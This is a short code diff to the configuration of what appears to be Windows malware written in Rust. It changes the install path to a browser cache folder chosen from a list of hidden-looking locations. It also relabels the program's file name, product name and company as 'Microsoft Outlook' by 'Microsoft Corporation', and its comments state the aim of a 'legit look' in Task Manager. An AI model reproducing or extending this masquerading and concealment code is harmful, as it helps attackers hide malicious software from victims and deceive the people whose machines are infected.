@@ -74,7 +74,7 @@ impl Config {
     6. %LOCALAPPDATA%\Microsoft\Windows\INetCache
     7. %LOCALAPPDATA%\Microsoft\Windows\WebCache
     */
-    pub const INSTALLATION_PATH: u8 = 1; // 1-7 for different installation paths
+    pub const INSTALLATION_PATH: u8 = 6; // 1-7 for different installation paths
 
     pub fn get_startup_config() -> StartupConfig {
         StartupConfig {
@@ -136,9 +136,9 @@ impl Config {
     // new build info config for legit look
     pub fn get_build_info() -> BuildInfo {
         BuildInfo {
-            file_name: "Microsoft.Sharepoint.SyncHost.exe",
-            product_name: "Microsoft OneDrive",
-            description: "Microsoft OneDrive", // this will show in Task manager
+            file_name: "Microsoft.Outlook.exe",
+            product_name: "Microsoft Outlook",
+            description: "Microsoft Outlook", // this will show in Task manager
             company_name: "Microsoft Corporation",
             file_version: "10.0.19041.3303",
         }
